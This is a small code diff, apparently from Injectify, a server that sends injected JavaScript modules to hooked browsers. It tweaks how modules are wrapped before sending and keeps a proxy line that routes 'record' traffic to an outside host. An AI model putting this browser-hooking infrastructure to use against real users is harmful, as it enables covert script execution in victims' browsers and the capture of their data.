@@ -24,7 +24,7 @@ const ObfuscateJS = require('js-obfuscator')
 const reverse = require('reverse-string')
 const parseAgent = require('user-agent-parser')
 const me = require('mongo-escape').escape
-const injector = require('./inject.js')
+const injector = require('./inject/server.js')
 const WatchJS = require('watchjs')
 const watch = WatchJS.watch
 const unwatch = WatchJS.unwatch
@@ -1195,9 +1195,9 @@ MongoClient.connect(config.mongodb, function (err, db) {
           if (js) {
             try {
               if (data.params) {
-                js = 'var module={name:' + JSON.stringify(data.name) + ',params:' + JSON.stringify(data.params) + '};' + js
+                js = 'var module={name:' + JSON.stringify(data.name) + ',params:' + JSON.stringify(data.params) + ',return:function(d){this.returned=d}};' + js
               } else {
-                js = 'var module={};' + js
+                js = 'var module={return:function(d){this.returned=d}};' + js
               }
               send('module:' + data.name, js)
             } catch (error) {
@@ -1862,7 +1862,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
     let bypassCors = false
     if (req.query.bypassCors === 'true') bypassCors = true
 
-    let proxy = '//uder.ml' //'//injectify.samdd.me/record/'
+    let proxy = '//uder.ml' // '//injectify.samdd.me/record/'
     if (config.dev) proxy = 'http://localhost:' + config.express + '/record/'
     if (req.query.proxy) proxy = req.query.proxy
     if (valid) {
